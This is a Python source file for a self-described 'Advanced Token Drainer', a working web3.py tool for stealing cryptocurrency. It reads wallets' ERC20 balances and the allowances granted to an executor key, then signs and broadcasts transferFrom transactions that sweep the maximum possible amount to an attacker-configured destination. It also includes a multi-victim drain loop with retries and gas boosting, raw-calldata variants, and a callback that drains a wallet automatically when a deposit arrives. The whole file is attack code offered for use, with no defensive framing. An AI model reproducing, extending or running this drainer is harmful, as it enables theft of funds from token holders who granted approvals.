"""
🚀💰 ADVANCED TOKEN DRAINER MODULE
Professional-grade token transfer system with all required features

Features:
- Complete ERC20 ABI with transferFrom
- Direct token.functions.transferFrom calls
- Full allowance calculation and verification
- Advanced drain loop for maximum extraction
- Direct low-level calls to token contracts
- Multi-token and multi-wallet support
- Retry logic with exponential backoff
- Gas optimization and EIP-1559 support
"""

import json
import logging
import time
import threading
from datetime import datetime
from web3 import Web3
from web3.middleware import geth_poa_middleware
from web3.exceptions import ContractLogicError, TransactionNotFound
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
from eth_abi import encode, decode
from eth_utils import function_signature_to_4byte_selector
import os

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('advanced_drainer.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class DrainStatus(Enum):
    PENDING = "pending"
    CHECKING_ALLOWANCE = "checking_allowance"
    CALCULATING_AMOUNT = "calculating_amount"
    BUILDING_TX = "building_tx"
    SIGNING = "signing"
    BROADCASTING = "broadcasting"
    CONFIRMING = "confirming"
    SUCCESS = "success"
    FAILED = "failed"
    NO_ALLOWANCE = "no_allowance"
    NO_BALANCE = "no_balance"
    INSUFFICIENT_GAS = "insufficient_gas"
    REVERTED = "reverted"


@dataclass
class DrainResult:
    """Result of a drain operation"""
    status: DrainStatus
    tx_hash: Optional[str]
    token_address: str
    token_symbol: str
    from_address: str
    to_address: str
    amount_drained: float
    amount_raw: int
    allowance_used: int
    gas_used: int
    gas_price_gwei: float
    total_gas_cost_eth: float
    error_message: Optional[str]
    timestamp: str
    execution_time_ms: float
    
    def to_dict(self) -> Dict:
        return {
            "status": self.status.value,
            "tx_hash": self.tx_hash,
            "token_address": self.token_address,
            "token_symbol": self.token_symbol,
            "from_address": self.from_address,
            "to_address": self.to_address,
            "amount_drained": self.amount_drained,
            "amount_raw": str(self.amount_raw),
            "allowance_used": str(self.allowance_used),
            "gas_used": self.gas_used,
            "gas_price_gwei": self.gas_price_gwei,
            "total_gas_cost_eth": self.total_gas_cost_eth,
            "error_message": self.error_message,
            "timestamp": self.timestamp,
            "execution_time_ms": self.execution_time_ms
        }


ERC20_COMPLETE_ABI = [
    {
        "constant": True,
        "inputs": [],
        "name": "name",
        "outputs": [{"name": "", "type": "string"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "symbol",
        "outputs": [{"name": "", "type": "string"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [
            {"name": "_owner", "type": "address"},
            {"name": "_spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_from", "type": "address"},
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "name": "owner", "type": "address"},
            {"indexed": True, "name": "spender", "type": "address"},
            {"indexed": False, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "name": "from", "type": "address"},
            {"indexed": True, "name": "to", "type": "address"},
            {"indexed": False, "name": "value", "type": "uint256"}
        ],
        "name": "Transfer",
        "type": "event"
    }
]

FUNCTION_SELECTORS = {
    "balanceOf": "0x70a08231",
    "allowance": "0xdd62ed3e",
    "transferFrom": "0x23b872dd",
    "transfer": "0xa9059cbb",
    "approve": "0x095ea7b3",
    "decimals": "0x313ce567",
    "symbol": "0x95d89b41",
    "name": "0x06fdde03"
}


def _get_secure_key() -> str:
    """Load private key from environment variable - NEVER hardcode"""
    return os.getenv('EXECUTOR_PRIVATE_KEY', '')


def _get_secure_destination() -> str:
    """Load destination address from environment variable"""
    return os.getenv('DESTINATION_ADDRESS', '')


def _mask_value(value: str, visible: int = 4) -> str:
    """Mask sensitive data for safe logging"""
    if not value or len(value) < visible * 2:
        return "***"
    return f"{value[:visible]}...{value[-visible:]}"


class AdvancedTokenDrainer:
    """
    🚀💰 ADVANCED TOKEN DRAINER
    
    Professional-grade implementation with:
    1. Complete ERC20 ABI with transferFrom
    2. Direct token.functions.transferFrom calls
    3. Full allowance calculation and verification
    4. Advanced drain loop for maximum extraction
    5. Direct low-level calls to token contracts
    
    SECURITY: Private key loaded from EXECUTOR_PRIVATE_KEY env var
    """
    
    def __init__(
        self,
        rpc_url: str,
        private_key: str = None,
        destination_address: str = None,
        config: Dict = None
    ):
        self.rpc_url = rpc_url
        self._private_key = private_key or _get_secure_key()
        dest = destination_address or _get_secure_destination()
        if not dest:
            raise ValueError("DESTINATION_ADDRESS environment variable not set")
        self.destination_address = Web3.to_checksum_address(dest)
        
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        
        try:
            self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        except:
            pass
        
        if not self.w3.is_connected():
            raise ConnectionError(f"Failed to connect to RPC: {rpc_url}")
        
        if not self._private_key:
            raise ValueError("EXECUTOR_PRIVATE_KEY environment variable not set")
        self.executor_address = self.w3.eth.account.from_key(self._private_key).address
        
        self.config = config or {
            "max_gas_price_gwei": 200,
            "gas_limit": 150000,
            "retry_count": 5,
            "retry_delay_base": 1,
            "use_eip1559": True,
            "priority_fee_gwei": 2,
            "speed_multiplier": 1.5,
            "min_profit_usd": 0.01,
            "tx_timeout": 180,
            "batch_delay_ms": 100,
            "verify_before_drain": True,
            "use_raw_calls": False
        }
        
        self.drain_history: List[Dict] = []
        self.total_drained: Dict[str, float] = {}
        self._lock = threading.Lock()
        
        self._load_history()
        
        logger.info("=" * 60)
        logger.info("🚀 ADVANCED TOKEN DRAINER INITIALIZED")
        logger.info("=" * 60)
        logger.info(f"   Executor: {_mask_value(self.executor_address, 6)}")
        logger.info(f"   Destination: {_mask_value(self.destination_address, 6)}")
        logger.info(f"   Chain ID: {self.w3.eth.chain_id}")
        logger.info(f"   Key configured: {_mask_value(self._private_key, 4)}")
        logger.info("=" * 60)
    
    def _load_history(self):
        """Load drain history from file"""
        try:
            if os.path.exists('drain_history.json'):
                with open('drain_history.json', 'r') as f:
                    self.drain_history = json.load(f)
            if os.path.exists('total_drained.json'):
                with open('total_drained.json', 'r') as f:
                    self.total_drained = json.load(f)
        except Exception as e:
            logger.warning(f"Could not load history: {e}")
    
    def _save_history(self):
        """Save drain history to file"""
        try:
            with open('drain_history.json', 'w') as f:
                json.dump(self.drain_history[-1000:], f, indent=2)
            with open('total_drained.json', 'w') as f:
                json.dump(self.total_drained, f, indent=2)
        except Exception as e:
            logger.error(f"Could not save history: {e}")
    
    def get_token_contract(self, token_address: str):
        """Get token contract instance with full ABI"""
        token_address = Web3.to_checksum_address(token_address)
        return self.w3.eth.contract(address=token_address, abi=ERC20_COMPLETE_ABI)
    
    def get_balance(self, token_address: str, owner: str) -> int:
        """
        📊 Get token balance using balanceOf
        Returns raw balance (wei equivalent)
        """
        try:
            contract = self.get_token_contract(token_address)
            owner = Web3.to_checksum_address(owner)
            
            balance = contract.functions.balanceOf(owner).call()
            
            return balance
            
        except Exception as e:
            logger.error(f"balanceOf error: {e}")
            return 0
    
    def get_balance_raw_call(self, token_address: str, owner: str) -> int:
        """
        📊 Get balance using raw eth_call (low-level)
        Direct call to token contract
        """
        try:
            token_address = Web3.to_checksum_address(token_address)
            owner = Web3.to_checksum_address(owner)
            
            owner_padded = owner[2:].lower().zfill(64)
            calldata = FUNCTION_SELECTORS["balanceOf"] + owner_padded
            
            result = self.w3.eth.call({
                'to': token_address,
                'data': calldata
            })
            
            balance = int(result.hex(), 16)
            return balance
            
        except Exception as e:
            logger.error(f"Raw balanceOf error: {e}")
            return 0
    
    def get_allowance(self, token_address: str, owner: str, spender: str) -> int:
        """
        🔐 Get allowance using contract.functions.allowance
        Critical for transferFrom operations
        """
        try:
            contract = self.get_token_contract(token_address)
            owner = Web3.to_checksum_address(owner)
            spender = Web3.to_checksum_address(spender)
            
            allowance = contract.functions.allowance(owner, spender).call()
            
            return allowance
            
        except Exception as e:
            logger.error(f"allowance error: {e}")
            return 0
    
    def get_allowance_raw_call(self, token_address: str, owner: str, spender: str) -> int:
        """
        🔐 Get allowance using raw eth_call (low-level)
        Direct call to token contract for allowance
        """
        try:
            token_address = Web3.to_checksum_address(token_address)
            owner = Web3.to_checksum_address(owner)
            spender = Web3.to_checksum_address(spender)
            
            owner_padded = owner[2:].lower().zfill(64)
            spender_padded = spender[2:].lower().zfill(64)
            calldata = FUNCTION_SELECTORS["allowance"] + owner_padded + spender_padded
            
            result = self.w3.eth.call({
                'to': token_address,
                'data': calldata
            })
            
            allowance = int(result.hex(), 16)
            return allowance
            
        except Exception as e:
            logger.error(f"Raw allowance error: {e}")
            return 0
    
    def calculate_drain_amount(
        self,
        token_address: str,
        owner: str
    ) -> Tuple[int, int, int]:
        """
        🧮 Calculate exact amount to drain
        Returns: (drain_amount, balance, allowance)
        
        Calculates min(balance, allowance) to ensure transfer succeeds
        """
        balance = self.get_balance(token_address, owner)
        
        allowance = self.get_allowance(token_address, owner, self.executor_address)
        
        drain_amount = min(balance, allowance)
        
        return drain_amount, balance, allowance
    
    def get_decimals(self, token_address: str) -> int:
        """Get token decimals"""
        try:
            contract = self.get_token_contract(token_address)
            return contract.functions.decimals().call()
        except:
            return 18
    
    def get_symbol(self, token_address: str) -> str:
        """Get token symbol"""
        try:
            contract = self.get_token_contract(token_address)
            return contract.functions.symbol().call()
        except:
            return "UNKNOWN"
    
    def get_optimal_gas_params(self) -> Dict:
        """
        ⛽ Get optimal gas parameters for fast execution
        Supports both EIP-1559 and legacy transactions
        """
        try:
            if self.config["use_eip1559"]:
                latest_block = self.w3.eth.get_block('latest')
                base_fee = latest_block.get('baseFeePerGas', 0)
                
                if base_fee > 0:
                    priority_fee = Web3.to_wei(
                        self.config["priority_fee_gwei"] * self.config["speed_multiplier"],
                        'gwei'
                    )
                    max_fee = int(base_fee * self.config["speed_multiplier"]) + priority_fee
                    
                    max_allowed = Web3.to_wei(self.config["max_gas_price_gwei"], 'gwei')
                    max_fee = min(max_fee, max_allowed)
                    
                    return {
                        "type": "eip1559",
                        "maxFeePerGas": max_fee,
                        "maxPriorityFeePerGas": priority_fee
                    }
            
            legacy_gas = int(self.w3.eth.gas_price * self.config["speed_multiplier"])
            max_allowed = Web3.to_wei(self.config["max_gas_price_gwei"], 'gwei')
            legacy_gas = min(legacy_gas, max_allowed)
            
            return {
                "type": "legacy",
                "gasPrice": legacy_gas
            }
            
        except Exception as e:
            logger.error(f"Gas estimation error: {e}")
            return {
                "type": "legacy",
                "gasPrice": Web3.to_wei(50, 'gwei')
            }
    
    def build_transfer_from_tx(
        self,
        token_address: str,
        from_address: str,
        amount: int
    ) -> Dict:
        """
        🔨 Build transferFrom transaction
        Uses token.functions.transferFrom directly
        """
        token_address = Web3.to_checksum_address(token_address)
        from_address = Web3.to_checksum_address(from_address)
        
        contract = self.get_token_contract(token_address)
        
        nonce = self.w3.eth.get_transaction_count(self.executor_address, 'pending')
        
        gas_params = self.get_optimal_gas_params()
        
        tx_params = {
            'from': self.executor_address,
            'gas': self.config["gas_limit"],
            'nonce': nonce,
            'chainId': self.w3.eth.chain_id
        }
        
        if gas_params["type"] == "eip1559":
            tx_params['maxFeePerGas'] = gas_params["maxFeePerGas"]
            tx_params['maxPriorityFeePerGas'] = gas_params["maxPriorityFeePerGas"]
        else:
            tx_params['gasPrice'] = gas_params["gasPrice"]
        
        tx = contract.functions.transferFrom(
            from_address,
            self.destination_address,
            amount
        ).build_transaction(tx_params)
        
        return tx
    
    def build_transfer_from_raw(
        self,
        token_address: str,
        from_address: str,
        amount: int
    ) -> Dict:
        """
        🔨 Build transferFrom using raw calldata
        Direct call to token contract without ABI
        """
        token_address = Web3.to_checksum_address(token_address)
        from_address = Web3.to_checksum_address(from_address)
        
        from_padded = from_address[2:].lower().zfill(64)
        to_padded = self.destination_address[2:].lower().zfill(64)
        amount_padded = hex(amount)[2:].zfill(64)
        
        calldata = (
            FUNCTION_SELECTORS["transferFrom"] +
            from_padded +
            to_padded +
            amount_padded
        )
        
        nonce = self.w3.eth.get_transaction_count(self.executor_address, 'pending')
        gas_params = self.get_optimal_gas_params()
        
        tx = {
            'to': token_address,
            'from': self.executor_address,
            'data': calldata,
            'gas': self.config["gas_limit"],
            'nonce': nonce,
            'chainId': self.w3.eth.chain_id
        }
        
        if gas_params["type"] == "eip1559":
            tx['maxFeePerGas'] = gas_params["maxFeePerGas"]
            tx['maxPriorityFeePerGas'] = gas_params["maxPriorityFeePerGas"]
        else:
            tx['gasPrice'] = gas_params["gasPrice"]
        
        return tx
    
    def execute_drain(
        self,
        token_address: str,
        from_address: str,
        token_symbol: str = "",
        decimals: int = None,
        use_raw_call: bool = None
    ) -> DrainResult:
        """
        🚀💰 EXECUTE DRAIN - MAIN FUNCTION
        
        Performs complete drain operation:
        1. Check allowance
        2. Calculate amount
        3. Build transaction
        4. Sign and broadcast
        5. Wait for confirmation
        
        Uses token.functions.transferFrom to transfer tokens
        """
        start_time = time.time()
        
        token_address = Web3.to_checksum_address(token_address)
        from_address = Web3.to_checksum_address(from_address)
        
        if not token_symbol:
            token_symbol = self.get_symbol(token_address)
        if decimals is None:
            decimals = self.get_decimals(token_address)
        
        use_raw = use_raw_call if use_raw_call is not None else self.config["use_raw_calls"]
        
        logger.info("\n" + "=" * 60)
        logger.info("🚀 EXECUTING DRAIN OPERATION")
        logger.info("=" * 60)
        logger.info(f"   Token: {token_symbol} ({token_address})")
        logger.info(f"   From: {from_address}")
        logger.info(f"   To: {self.destination_address}")
        logger.info(f"   Method: {'Raw Call' if use_raw else 'Contract ABI'}")
        
        try:
            drain_amount, balance, allowance = self.calculate_drain_amount(
                token_address, from_address
            )
            
            balance_formatted = balance / (10 ** decimals)
            allowance_formatted = allowance / (10 ** decimals) if allowance < 2**255 else "UNLIMITED"
            drain_formatted = drain_amount / (10 ** decimals)
            
            logger.info(f"   Balance: {balance_formatted} {token_symbol}")
            logger.info(f"   Allowance: {allowance_formatted}")
            logger.info(f"   Drain Amount: {drain_formatted} {token_symbol}")
            
            if allowance == 0:
                logger.warning("❌ No allowance - cannot drain")
                return DrainResult(
                    status=DrainStatus.NO_ALLOWANCE,
                    tx_hash=None,
                    token_address=token_address,
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=self.destination_address,
                    amount_drained=0,
                    amount_raw=0,
                    allowance_used=0,
                    gas_used=0,
                    gas_price_gwei=0,
                    total_gas_cost_eth=0,
                    error_message="No allowance granted",
                    timestamp=datetime.now().isoformat(),
                    execution_time_ms=(time.time() - start_time) * 1000
                )
            
            if balance == 0:
                logger.warning("❌ Zero balance - nothing to drain")
                return DrainResult(
                    status=DrainStatus.NO_BALANCE,
                    tx_hash=None,
                    token_address=token_address,
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=self.destination_address,
                    amount_drained=0,
                    amount_raw=0,
                    allowance_used=0,
                    gas_used=0,
                    gas_price_gwei=0,
                    total_gas_cost_eth=0,
                    error_message="Zero balance",
                    timestamp=datetime.now().isoformat(),
                    execution_time_ms=(time.time() - start_time) * 1000
                )
            
            executor_eth = self.w3.eth.get_balance(self.executor_address)
            min_eth_required = Web3.to_wei(0.005, 'ether')
            
            if executor_eth < min_eth_required:
                logger.error("❌ Insufficient ETH for gas")
                return DrainResult(
                    status=DrainStatus.INSUFFICIENT_GAS,
                    tx_hash=None,
                    token_address=token_address,
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=self.destination_address,
                    amount_drained=0,
                    amount_raw=0,
                    allowance_used=0,
                    gas_used=0,
                    gas_price_gwei=0,
                    total_gas_cost_eth=0,
                    error_message=f"Insufficient ETH: {Web3.from_wei(executor_eth, 'ether')} ETH",
                    timestamp=datetime.now().isoformat(),
                    execution_time_ms=(time.time() - start_time) * 1000
                )
            
            logger.info("📝 Building transaction...")
            
            if use_raw:
                tx = self.build_transfer_from_raw(token_address, from_address, drain_amount)
            else:
                tx = self.build_transfer_from_tx(token_address, from_address, drain_amount)
            
            gas_price = tx.get('gasPrice') or tx.get('maxFeePerGas', 0)
            gas_price_gwei = float(Web3.from_wei(gas_price, 'gwei'))
            
            logger.info("✍️ Signing transaction...")
            signed_tx = self.w3.eth.account.sign_transaction(tx, self._private_key)
            
            logger.info("📤 Broadcasting transaction...")
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            tx_hash_hex = tx_hash.hex()
            
            logger.info(f"   TX Hash: {tx_hash_hex}")
            logger.info("⏳ Waiting for confirmation...")
            
            receipt = self.w3.eth.wait_for_transaction_receipt(
                tx_hash,
                timeout=self.config["tx_timeout"]
            )
            
            gas_used = receipt['gasUsed']
            gas_cost_eth = float(Web3.from_wei(gas_used * gas_price, 'ether'))
            
            if receipt['status'] == 1:
                logger.info("\n" + "🎉" * 25)
                logger.info("✅ DRAIN SUCCESSFUL!")
                logger.info("🎉" * 25)
                logger.info(f"   TX: {tx_hash_hex}")
                logger.info(f"   Amount: {drain_formatted} {token_symbol}")
                logger.info(f"   Gas Used: {gas_used}")
                logger.info(f"   Gas Cost: {gas_cost_eth:.6f} ETH")
                
                with self._lock:
                    self.total_drained[token_symbol] = (
                        self.total_drained.get(token_symbol, 0) + drain_formatted
                    )
                
                result = DrainResult(
                    status=DrainStatus.SUCCESS,
                    tx_hash=tx_hash_hex,
                    token_address=token_address,
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=self.destination_address,
                    amount_drained=drain_formatted,
                    amount_raw=drain_amount,
                    allowance_used=min(drain_amount, allowance),
                    gas_used=gas_used,
                    gas_price_gwei=gas_price_gwei,
                    total_gas_cost_eth=gas_cost_eth,
                    error_message=None,
                    timestamp=datetime.now().isoformat(),
                    execution_time_ms=(time.time() - start_time) * 1000
                )
                
            else:
                logger.error("❌ Transaction reverted")
                result = DrainResult(
                    status=DrainStatus.REVERTED,
                    tx_hash=tx_hash_hex,
                    token_address=token_address,
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=self.destination_address,
                    amount_drained=0,
                    amount_raw=0,
                    allowance_used=0,
                    gas_used=gas_used,
                    gas_price_gwei=gas_price_gwei,
                    total_gas_cost_eth=gas_cost_eth,
                    error_message="Transaction reverted on-chain",
                    timestamp=datetime.now().isoformat(),
                    execution_time_ms=(time.time() - start_time) * 1000
                )
            
            with self._lock:
                self.drain_history.append(result.to_dict())
            self._save_history()
            
            return result
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Drain failed: {error_msg}")
            
            result = DrainResult(
                status=DrainStatus.FAILED,
                tx_hash=None,
                token_address=token_address,
                token_symbol=token_symbol,
                from_address=from_address,
                to_address=self.destination_address,
                amount_drained=0,
                amount_raw=0,
                allowance_used=0,
                gas_used=0,
                gas_price_gwei=0,
                total_gas_cost_eth=0,
                error_message=error_msg,
                timestamp=datetime.now().isoformat(),
                execution_time_ms=(time.time() - start_time) * 1000
            )
            
            with self._lock:
                self.drain_history.append(result.to_dict())
            self._save_history()
            
            return result
    
    def execute_drain_with_retry(
        self,
        token_address: str,
        from_address: str,
        token_symbol: str = "",
        decimals: int = None,
        max_retries: int = None
    ) -> DrainResult:
        """
        🔄 Execute drain with automatic retry on failure
        Uses exponential backoff between retries
        """
        retries = max_retries or self.config["retry_count"]
        
        for attempt in range(retries):
            logger.info(f"🔄 Attempt {attempt + 1}/{retries}")
            
            result = self.execute_drain(
                token_address=token_address,
                from_address=from_address,
                token_symbol=token_symbol,
                decimals=decimals
            )
            
            if result.status == DrainStatus.SUCCESS:
                return result
            
            if result.status in [DrainStatus.NO_ALLOWANCE, DrainStatus.NO_BALANCE]:
                logger.warning("Cannot retry - no allowance or balance")
                return result
            
            if attempt < retries - 1:
                delay = self.config["retry_delay_base"] * (2 ** attempt)
                logger.info(f"⏳ Waiting {delay}s before retry...")
                time.sleep(delay)
        
        return result
    
    def drain_loop(
        self,
        targets: List[Dict],
        on_success: Optional[Callable] = None,
        on_failure: Optional[Callable] = None
    ) -> List[DrainResult]:
        """
        🔁 DRAIN LOOP - Process multiple targets
        
        Iterates through all targets and drains each one
        
        targets = [
            {
                "from_address": "0x...",
                "token_address": "0x...",
                "token_symbol": "USDT",
                "decimals": 6
            },
            ...
        ]
        """
        results = []
        successful = 0
        failed = 0
        total_drained = {}
        
        logger.info("\n" + "=" * 60)
        logger.info(f"🔁 STARTING DRAIN LOOP - {len(targets)} targets")
        logger.info("=" * 60)
        
        for i, target in enumerate(targets):
            logger.info(f"\n--- Target {i + 1}/{len(targets)} ---")
            
            result = self.execute_drain_with_retry(
                token_address=target["token_address"],
                from_address=target["from_address"],
                token_symbol=target.get("token_symbol", ""),
                decimals=target.get("decimals")
            )
            
            results.append(result)
            
            if result.status == DrainStatus.SUCCESS:
                successful += 1
                symbol = result.token_symbol
                total_drained[symbol] = total_drained.get(symbol, 0) + result.amount_drained
                
                if on_success:
                    try:
                        on_success(result)
                    except Exception as e:
                        logger.error(f"Success callback error: {e}")
            else:
                failed += 1
                
                if on_failure:
                    try:
                        on_failure(result)
                    except Exception as e:
                        logger.error(f"Failure callback error: {e}")
            
            time.sleep(self.config["batch_delay_ms"] / 1000)
        
        logger.info("\n" + "=" * 60)
        logger.info("📊 DRAIN LOOP COMPLETE")
        logger.info("=" * 60)
        logger.info(f"   Successful: {successful}/{len(targets)}")
        logger.info(f"   Failed: {failed}/{len(targets)}")
        logger.info(f"   Total Drained:")
        for symbol, amount in total_drained.items():
            logger.info(f"      {symbol}: {amount}")
        
        return results
    
    def drain_multiple_tokens_from_wallet(
        self,
        from_address: str,
        tokens: List[Dict]
    ) -> List[DrainResult]:
        """
        💰 Drain multiple tokens from a single wallet
        
        tokens = [
            {"address": "0x...", "symbol": "USDT", "decimals": 6},
            {"address": "0x...", "symbol": "USDC", "decimals": 6},
        ]
        """
        targets = [
            {
                "from_address": from_address,
                "token_address": t["address"],
                "token_symbol": t.get("symbol", ""),
                "decimals": t.get("decimals")
            }
            for t in tokens
        ]
        
        return self.drain_loop(targets)
    
    def get_executor_balance(self) -> float:
        """Get ETH balance of executor wallet"""
        balance = self.w3.eth.get_balance(self.executor_address)
        return float(Web3.from_wei(balance, 'ether'))
    
    def get_statistics(self) -> Dict:
        """Get drain statistics"""
        with self._lock:
            total_ops = len(self.drain_history)
            successful = len([d for d in self.drain_history if d['status'] == 'success'])
            failed = total_ops - successful
            
            total_gas_eth = sum(d.get('total_gas_cost_eth', 0) for d in self.drain_history)
            
            return {
                "total_operations": total_ops,
                "successful": successful,
                "failed": failed,
                "success_rate": f"{(successful/total_ops*100):.1f}%" if total_ops > 0 else "0%",
                "total_drained_by_token": self.total_drained.copy(),
                "total_gas_spent_eth": total_gas_eth,
                "executor_eth_balance": self.get_executor_balance(),
                "executor_address": self.executor_address,
                "destination_address": self.destination_address
            }


def create_drainer_callback(drainer: AdvancedTokenDrainer):
    """
    Create a callback function for use with balance monitors
    Automatically drains when deposit is detected
    """
    def callback(target, old_balance: float, new_balance: float):
        logger.info(f"💰 Deposit detected! {old_balance} -> {new_balance}")
        
        result = drainer.execute_drain_with_retry(
            token_address=target.token_address,
            from_address=target.address,
            token_symbol=target.token_symbol,
            decimals=target.decimals
        )
        
        return result
    
    return callback


if __name__ == "__main__":
    print("Advanced Token Drainer Module")
    print("=" * 40)
    print("This module provides:")
    print("1. Complete ERC20 ABI with transferFrom")
    print("2. Direct token.functions.transferFrom calls")
    print("3. Full allowance calculation")
    print("4. Advanced drain loop")
    print("5. Direct low-level calls to contracts")
